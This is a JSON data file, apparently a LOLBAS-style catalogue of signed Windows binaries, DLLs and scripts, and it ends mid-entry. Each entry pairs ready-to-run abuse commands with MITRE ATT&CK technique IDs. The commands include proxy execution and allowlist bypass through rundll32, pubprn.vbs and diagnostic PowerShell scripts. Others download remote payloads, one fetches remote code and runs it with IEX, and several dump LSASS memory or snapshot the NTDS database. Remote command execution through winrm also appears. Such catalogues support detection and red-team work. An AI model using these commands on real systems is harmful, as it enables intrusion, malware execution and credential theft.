                    "label": "Executes click-once-application from URL (trampoline for Dfsvc.exe, DotNet ClickOnce host)",
                    "code": "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1127.002",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127.002/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Ieadvpack.dll",
            "description": "INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.",
            "categories": [
                "awl-bypass",
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).",
                    "code": "rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,"
                },
                {
                    "label": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).",
                    "code": "rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,"
                },
                {
                    "label": "Launch a DLL payload by calling the RegisterOCX function.",
                    "code": "rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.dll}"
                },
                {
                    "label": "Launch an executable by calling the RegisterOCX function.",
                    "code": "rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}"
                },
                {
                    "label": "Launch command line by calling the RegisterOCX function.",
                    "code": "rundll32 ieadvpack.dll, RegisterOCX {CMD}"
                }
            ],
            "mitre": {
                "technique": "T1218.011",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.011/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Ieframe.dll",
            "description": "Internet Browser DLL for translating HTML code.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL.",
                    "code": "rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}"
                }
            ],
            "mitre": {
                "technique": "T1218.011",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.011/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Mshtml.dll",
            "description": "Microsoft HTML Viewer",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Invoke an HTML Application via mshta.exe (note: pops a security warning and a print dialogue box).",
                    "code": "rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}"
                }
            ],
            "mitre": {
                "technique": "T1218.011",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.011/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Pcwutl.dll",
            "description": "Microsoft HTML Viewer",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Launch executable by calling the LaunchApplication function.",
                    "code": "rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1218.011",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.011/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "PhotoViewer.dll",
            "description": "Windows Photo Viewer",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache folder using the Windows Photo Viewer DLL.",
                    "code": "rundll32.exe \"C:\\Program Files\\Windows Photo Viewer\\PhotoViewer.dll\",ImageView_Fullscreen {REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Scrobj.dll",
            "description": "Windows Script Component Runtime",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache.",
                    "code": "rundll32.exe C:\\Windows\\System32\\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Setupapi.dll",
            "description": "Windows Setup Application Programming Interface",
            "categories": [
                "awl-bypass",
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).",
                    "code": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}"
                },
                {
                    "label": "Launch an executable file via the InstallHinfSection function and .inf file section directive.",
                    "code": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}"
                }
            ],
            "mitre": {
                "technique": "T1218.011",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.011/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Shdocvw.dll",
            "description": "Shell Doc Object and Control Library.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Launch an executable payload via proxy through a URL (information) file by calling OpenURL.",
                    "code": "rundll32.exe shdocvw.dll,OpenURL {PATH_ABSOLUTE:.url}"
                }
            ],
            "mitre": {
                "technique": "T1218.011",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.011/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Shell32.dll",
            "description": "Windows Shell Common Dll",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Launch a DLL payload by calling the Control_RunDLL function.",
                    "code": "rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}"
                },
                {
                    "label": "Launch an executable by calling the ShellExec_RunDLL function.",
                    "code": "rundll32.exe shell32.dll,ShellExec_RunDLL {PATH:.exe}"
                },
                {
                    "label": "Launch command line by calling the ShellExec_RunDLL function.",
                    "code": "rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}"
                },
                {
                    "label": "Load a DLL/CPL by calling undocumented Control_RunDLLNoFallback function.",
                    "code": "rundll32.exe shell32.dll,#44 {PATH:.dll}"
                }
            ],
            "mitre": {
                "technique": "T1218.011",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.011/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Shimgvw.dll",
            "description": "Photo Gallery Viewer",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'.",
                    "code": "rundll32.exe c:\\Windows\\System32\\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Syssetup.dll",
            "description": "Windows NT System Setup",
            "categories": [
                "awl-bypass",
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).",
                    "code": "rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}"
                },
                {
                    "label": "Launch an executable file via the SetupInfObjectInstallAction function and .inf file section directive.",
                    "code": "rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}"
                }
            ],
            "mitre": {
                "technique": "T1218.011",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.011/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Url.dll",
            "description": "Internet Shortcut Shell Extension DLL.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Launch a HTML application payload by calling OpenURL.",
                    "code": "rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}"
                },
                {
                    "label": "Launch an executable payload via proxy through a .url (information) file by calling OpenURL.",
                    "code": "rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.url}"
                },
                {
                    "label": "Launch an executable by calling OpenURL.",
                    "code": "rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e"
                },
                {
                    "label": "Launch an executable by calling FileProtocolHandler.",
                    "code": "rundll32.exe url.dll,FileProtocolHandler {PATH_ABSOLUTE:.exe}"
                },
                {
                    "label": "Launch an executable by calling FileProtocolHandler.",
                    "code": "rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e"
                },
                {
                    "label": "Launch a HTML application payload by calling FileProtocolHandler.",
                    "code": "rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta"
                }
            ],
            "mitre": {
                "technique": "T1218.011",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.011/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Zipfldr.dll",
            "description": "Compressed Folder library",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Launch an executable payload by calling RouteTheCall.",
                    "code": "rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}"
                },
                {
                    "label": "Launch an executable payload by calling RouteTheCall (obfuscated).",
                    "code": "rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e"
                }
            ],
            "mitre": {
                "technique": "T1218.011",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.011/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Comsvcs.dll",
            "description": "COM+ Services",
            "categories": [
                "dump"
            ],
            "commands": [
                {
                    "label": "Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump.",
                    "code": "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump {LSASS_PID} dump.bin full"
                }
            ],
            "mitre": {
                "technique": "T1003.001",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1003.001/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "CL_LoadAssembly.ps1",
            "description": "PowerShell Diagnostic Script",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Proxy execute Managed DLL with PowerShell",
                    "code": "powershell.exe -ep bypass -command \"set-location -path C:\\Windows\\diagnostics\\system\\Audio; import-module .\\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\\..\\..\\..\\testing\\fun.dll;[Program]::Fun()\""
                }
            ],
            "mitre": {
                "technique": "T1216",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1216/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "CL_Mutexverifiers.ps1",
            "description": "Proxy execution with CL_Mutexverifiers.ps1",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Import the PowerShell Diagnostic CL_Mutexverifiers script and call runAfterCancelProcess to launch an executable.",
                    "code": ". C:\\Windows\\diagnostics\\system\\AERO\\CL_Mutexverifiers.ps1   \\nrunAfterCancelProcess {PATH:.ps1}"
                }
            ],
            "mitre": {
                "technique": "T1216",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1216/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "CL_Invocation.ps1",
            "description": "Aero diagnostics script",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable.",
                    "code": ". C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1   \\nSyncInvoke {CMD}"
                }
            ],
            "mitre": {
                "technique": "T1216",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1216/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Launch-VsDevShell.ps1",
            "description": "Locates and imports a Developer PowerShell module and calls the Enter-VsDevShell cmdlet",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute binaries from the context of the signed script using the \"VsWherePath\" flag.",
                    "code": "powershell -ep RemoteSigned -f .\\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe}"
                },
                {
                    "label": "Execute binaries and commands from the context of the signed script using the \"VsInstallationPath\" flag.",
                    "code": "powershell -ep RemoteSigned -f .\\Launch-VsDevShell.ps1 -VsInstallationPath \"/../../../../../; {PATH:.exe} ;\""
                }
            ],
            "mitre": {
                "technique": "T1216",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1216/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Manage-bde.wsf",
            "description": "Script for managing BitLocker",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.",
                    "code": "set comspec={PATH_ABSOLUTE:.exe} & cscript c:\\windows\\system32\\manage-bde.wsf"
                },
                {
                    "label": "Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.",
                    "code": "copy c:\\users\\person\\evil.exe c:\\users\\public\\manage-bde.exe & cd c:\\users\\public\\ & cscript.exe c:\\windows\\system32\\manage-bde.wsf"
                }
            ],
            "mitre": {
                "technique": "T1216",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1216/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Pubprn.vbs",
            "description": "Proxy execution with Pubprn.vbs",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection",
                    "code": "pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}"
                }
            ],
            "mitre": {
                "technique": "T1216.001",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1216.001/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Syncappvpublishingserver.vbs",
            "description": "Script used related to app-v and publishing server",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Inject PowerShell script code with the provided arguments",
                    "code": "SyncAppvPublishingServer.vbs \"n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX\""
                }
            ],
            "mitre": {
                "technique": "T1216.002",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1216.002/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "UtilityFunctions.ps1",
            "description": "PowerShell Diagnostic Script",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Proxy execute Managed DLL with PowerShell",
                    "code": "powershell.exe -ep bypass -command \"set-location -path c:\\windows\\diagnostics\\system\\networking; import-module .\\UtilityFunctions.ps1; RegSnapin ..\\..\\..\\..\\temp\\unsigned.dll;[Program.Class]::Main()\""
                }
            ],
            "mitre": {
                "technique": "T1216",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1216/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "winrm.vbs",
            "description": "Script used for manage Windows RM settings",
            "categories": [
                "execute",
                "awl-bypass"
            ],
            "commands": [
                {
                    "label": "Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol",
                    "code": "winrm invoke Create wmicimv2/Win32_Process @{CommandLine=\"{CMD}\"} -r:http://target:5985"
                },
                {
                    "label": "Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol",
                    "code": "winrm invoke Create wmicimv2/Win32_Service @{Name=\"Evil\";DisplayName=\"Evil\";PathName=\"{CMD}\"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985"
                },
                {
                    "label": "Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe.",
                    "code": "%SystemDrive%\\BypassDir\\cscript //nologo %windir%\\System32\\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty"
                }
            ],
            "mitre": {
                "technique": "T1216",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1216/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Pester.bat",
            "description": "Used as part of the Powershell pester",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute code using Pester. The third parameter can be anything. The fourth is the payload.",
                    "code": "Pester.bat [/help|?|-?|/?] \"$null; {CMD}\""
                },
                {
                    "label": "Execute code using Pester. Example here executes specified executable.",
                    "code": "Pester.bat ;{PATH:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1216",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1216/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "AccCheckConsole.exe",
            "description": "Verifies UI accessibility requirements",
            "categories": [
                "execute",
                "awl-bypass"
            ],
            "commands": [
                {
                    "label": "Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name.",
                    "code": "AccCheckConsole.exe -window \"Untitled - Notepad\" {PATH_ABSOLUTE:.dll}"
                },
                {
                    "label": "Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name.",
                    "code": "AccCheckConsole.exe -window \"Untitled - Notepad\" {PATH_ABSOLUTE:.dll}"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "adplus.exe",
            "description": "Debugging tool included with Windows Debugging Tools",
            "categories": [
                "dump",
                "execute"
            ],
            "commands": [
                {
                    "label": "Creates a memory dump of the lsass process",
                    "code": "adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet"
                },
                {
                    "label": "Execute arbitrary commands using adplus config file (see Resources section for a sample file).",
                    "code": "adplus.exe -c {PATH:.xml}"
                },
                {
                    "label": "Dump process memory using adplus config file (see Resources section for a sample file).",
                    "code": "adplus.exe -c {PATH:.xml}"
                },
                {
                    "label": "Execute arbitrary commands and binaries from the context of adplus. Note that providing an output directory via '-o' is required.",
                    "code": "adplus.exe -crash -o \"{PATH_ABSOLUTE:folder}\" -sc {PATH:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1003.001",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1003.001/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "AgentExecutor.exe",
            "description": "Intune Management Extension included on Intune Managed Devices",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument",
                    "code": "AgentExecutor.exe -powershell \"{PATH_ABSOLUTE:.ps1}\" \"{PATH_ABSOLUTE:.1.log}\" \"{PATH_ABSOLUTE:.2.log}\" \"{PATH_ABSOLUTE:.3.log}\" 60000 \"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\" 0 1"
                },
                {
                    "label": "If we place a binary named powershell.exe in the specified folder path, agentexecutor.exe will execute it successfully",
                    "code": "AgentExecutor.exe -powershell \"{PATH_ABSOLUTE:.ps1}\" \"{PATH_ABSOLUTE:.1.log}\" \"{PATH_ABSOLUTE:.2.log}\" \"{PATH_ABSOLUTE:.3.log}\" 60000 \"{PATH_ABSOLUTE:folder}\" 0 1"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "AppLauncher.exe",
            "description": "User Experience Virtualization tool that launches applications under monitoring to capture and synchronize user settings.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Launches an executable via User Experience Virtualization tool.",
                    "code": "AppLauncher.exe {PATH_ABSOLUTE:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "AppCert.exe",
            "description": "Windows App Certification Kit command-line tool.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute an executable file via the Windows App Certification Kit command-line tool.",
                    "code": "appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.exe} -reportoutputpath {PATH_ABSOLUTE:.xml}"
                },
                {
                    "label": "Install an MSI file via an msiexec instance spawned via appcert.exe as parent process.",
                    "code": "appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.msi} -setupcommandline /q -reportoutputpath {PATH_ABSOLUTE:.xml}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Appvlp.exe",
            "description": "Application Virtualization Utility Included with Microsoft Office 2016",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Executes .bat file through AppVLP.exe",
                    "code": "AppVLP.exe {PATH_SMB:.bat}"
                },
                {
                    "label": "Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.",
                    "code": "AppVLP.exe powershell.exe -c \"$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)\""
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Bcp.exe",
            "description": "Microsoft SQL Server Bulk Copy Program utility for importing and exporting data between SQL Server instances and data files.",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Export binary payload stored in SQL Server database to file system.",
                    "code": "bcp \"SELECT payload_data FROM database.dbo.payloads WHERE id=1\" queryout \"C:\\Windows\\Temp\\payload.exe\" -S localhost -T -c"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Bginfo.exe",
            "description": "Background Information Utility included with SysInternals Suite",
            "categories": [
                "execute",
                "awl-bypass"
            ],
            "commands": [
                {
                    "label": "Execute VBscript code that is referenced within the specified .bgi file.",
                    "code": "bginfo.exe {PATH:.bgi} /popup /nolicprompt"
                },
                {
                    "label": "Execute VBscript code that is referenced within the specified .bgi file.",
                    "code": "bginfo.exe {PATH:.bgi} /popup /nolicprompt"
                },
                {
                    "label": "Execute bginfo.exe from a WebDAV server.",
                    "code": "\\\\10.10.10.10\\webdav\\bginfo.exe {PATH:.bgi} /popup /nolicprompt"
                },
                {
                    "label": "Execute bginfo.exe from a WebDAV server.",
                    "code": "\\\\10.10.10.10\\webdav\\bginfo.exe {PATH:.bgi} /popup /nolicprompt"
                },
                {
                    "label": "This style of execution may not longer work due to patch.",
                    "code": "\\\\live.sysinternals.com\\Tools\\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt"
                },
                {
                    "label": "This style of execution may not longer work due to patch.",
                    "code": "\\\\live.sysinternals.com\\Tools\\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Cdb.exe",
            "description": "Debugging tool included with Windows Debugging Tools.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Launch 64-bit shellcode from the specified .wds file using cdb.exe.",
                    "code": "cdb.exe -cf {PATH:.wds} -o notepad.exe"
                },
                {
                    "label": "Attaching to any process and executing shell commands.",
                    "code": "cdb.exe -pd -pn {process_name}\n.shell {CMD}\n"
                },
                {
                    "label": "Execute arbitrary commands and binaries using a debugging script (see Resources section for a sample file).",
                    "code": "cdb.exe -c {PATH:.txt} \"{CMD}\""
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "coregen.exe",
            "description": "Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within \"C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\\" or another version of Silverlight. Coregen is signed by Microsoft and bundled with Microsoft Silverlight.",
            "categories": [
                "execute",
                "awl-bypass"
            ],
            "commands": [
                {
                    "label": "Loads the target .DLL in arbitrary path specified with /L.",
                    "code": "coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name"
                },
                {
                    "label": "Loads the coreclr.dll in the corgen.exe directory (e.g. C:\\Program Files\\Microsoft Silverlight\\5.1.50918.0).",
                    "code": "coregen.exe dummy_assembly_name"
                },
                {
                    "label": "Loads the target .DLL in arbitrary path specified with /L. Since binary is signed it can also be used to bypass application whitelisting solutions.",
                    "code": "coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name"
                }
            ],
            "mitre": {
                "technique": "T1055",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1055/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Createdump.exe",
            "description": "Microsoft .NET Runtime Crash Dump Generator (included in .NET Core)",
            "categories": [
                "dump"
            ],
            "commands": [
                {
                    "label": "Dump process by PID and create a minidump file. If \"-f dump.dmp\" is not specified, the file is created as '%TEMP%\\dump.%p.dmp' where %p is the PID of the target process.",
                    "code": "createdump.exe -n -f {PATH:.dmp} {PID}"
                }
            ],
            "mitre": {
                "technique": "T1003",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1003/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "csi.exe",
            "description": "Command line interface included with Visual Studio.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Use csi.exe to run unsigned C# code.",
                    "code": "csi.exe {PATH:.cs}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "DefaultPack.EXE",
            "description": "This binary can be downloaded along side multiple software downloads on the Microsoft website. It gets downloaded when the user forgets to uncheck the option to set Bing as the default search provider.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Use DefaultPack.EXE to execute arbitrary binaries, with added argument support.",
                    "code": "DefaultPack.EXE /C:\"{CMD}\""
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Devinit.exe",
            "description": "Visual Studio 2019 tool",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Downloads an MSI file to C:\\Windows\\Installer and then installs it.",
                    "code": "devinit.exe run -t msi-install -i {REMOTEURL:.msi}"
                }
            ],
            "mitre": {
                "technique": "T1218.007",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.007/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Devtoolslauncher.exe",
            "description": "Binary will execute specified binary. Part of VS/VScode installation.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "The above binary will execute other binary.",
                    "code": "devtoolslauncher.exe LaunchForDeploy {PATH_ABSOLUTE:.exe} \"{CMD:args}\" test"
                },
                {
                    "label": "The above binary will execute other binary.",
                    "code": "devtoolslauncher.exe LaunchForDebug {PATH_ABSOLUTE:.exe} \"{CMD:args}\" test"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "dnx.exe",
            "description": ".NET Execution environment file included with .NET.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute C# code located in the specified folder via 'Program.cs' and 'Project.json' (Note - Requires dependencies)",
                    "code": "dnx.exe {PATH_ABSOLUTE:folder}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Dotnet.exe",
            "description": "dotnet.exe comes with .NET Framework",
            "categories": [
                "awl-bypass",
                "execute"
            ],
            "commands": [
                {
                    "label": "dotnet.exe will execute any DLL even if applocker is enabled.",
                    "code": "dotnet.exe {PATH:.dll}"
                },
                {
                    "label": "dotnet.exe will execute any DLL.",
                    "code": "dotnet.exe {PATH:.dll}"
                },
                {
                    "label": "dotnet.exe will open a console which allows for the execution of arbitrary F# commands",
                    "code": "dotnet.exe fsi"
                },
                {
                    "label": "dotnet.exe with msbuild (SDK Version) will execute unsigned code",
                    "code": "dotnet.exe msbuild {PATH:.csproj}"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "dsdbutil.exe",
            "description": "Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.",
            "categories": [
                "dump"
            ],
            "commands": [
                {
                    "label": "dsdbutil supports VSS snapshot creation",
                    "code": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"create\" \"quit\" \"quit\""
                },
                {
                    "label": "Mounting the snapshot with its GUID",
                    "code": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"mount {GUID}\" \"quit\" \"quit\""
                },
                {
                    "label": "Deletes the mount of the snapshot",
                    "code": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"delete {GUID}\" \"quit\" \"quit\""
                },
                {
                    "label": "Mounting with snapshot identifier",
                    "code": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"create\" \"list all\" \"mount 1\" \"quit\" \"quit\""
                },
                {
                    "label": "Deletes the mount of the snapshot",
                    "code": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"list all\" \"delete 1\" \"quit\" \"quit\""
                }
            ],
            "mitre": {
                "technique": "T1003.003",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1003.003/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "dtutil.exe",
            "description": "Microsoft command line utility used to manage SQL Server Integration Services packages.",
            "categories": [
                "copy"
            ],
            "commands": [
                {
                    "label": "Copy file from source to destination",
